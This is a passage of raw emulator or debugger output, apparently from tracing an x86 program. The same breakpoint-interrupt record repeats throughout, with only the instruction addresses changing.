cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457fb3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457fbe, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457fcc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457fd6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457ff5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458007, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45801c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458032, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4580b8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4580d2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4580df, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4580f7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458104, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458125, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45812a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458138, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458142, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45814f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458163, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45817f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458193, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4581a5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4581be, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4581d7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4581ff, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45820e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458217, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45822f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458234, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458251, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458257, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45826f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45827a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 458287, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45829d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4582bb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4582cd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4582d9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4582ed, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4582f6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455b42, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455b6c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455b7d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455b88, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455bb4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455bbb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455bd1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455bda, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455bda, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455bda, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455bfd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455c0e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455c22, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455c2f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455c49, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455c5a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455c6b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455c88, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455c96, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455cb3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455cb3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455cb3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455cc7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455cd3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455ced, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455d00, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455d14, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455d2e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455db1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455dd4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455de8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455df1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455e04, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455e18, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455e29, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455e34, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455e47, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455e52, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455e62, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455e6d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455e7e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455e93, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455e9d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455ea8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455ebc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455ed0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455ee9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455f02, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455f17, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455f27, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455f42, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455f47, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455f47, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455f47, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455f5b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455f67, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455f77, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455f87, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455f99, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455fac, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455fc2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455fd0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455fe1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455ff0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455ff4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454d36, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454d41, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454d4a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454d55, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454d63, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454d76, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454d8e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454d9e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454da5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454dc9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454ddc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454df9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454e0e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454e1b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454e30, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454e4a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454e8b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454f05, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454f10, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454f10, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454f10, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454f22, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454f38, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454f4c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454f55, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454f6c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454f7e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454f8f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454f99, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454fb1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454fc1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454fdf, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 454ff2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455005, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455005, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455005, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455021, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455026, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45503b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455052, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45506d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45507d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455089, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45509d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4550ad, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4550b7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4550d6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4550e9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455105, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45510b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45511b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455132, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45514a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455158, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455178, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45518a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455191, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455191, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455191, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4551ae, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455210, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455226, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455237, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45524c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455258, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455276, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45528d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4552a1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4552ac, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4552b5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4552cf, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4552e7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455303, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455313, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455326, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455331, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455359, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455370, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455386, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4553ab, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4553c4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4553d2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4553e7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4553f7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455403, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45541c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455423, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45543a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455447, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455459, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455468, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4554d2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4554e5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4554f2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45550b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455529, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45553d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45554e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45555e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455564, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45557b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455586, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455592, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4555c3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4555e1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4555f0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45560b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455611, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455611, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455611, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45562b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45563d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455658, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45566a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 455671, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45569a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4556ad, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 4556bc, cs = 23 context switch, stopping emulation forced exit memory operation 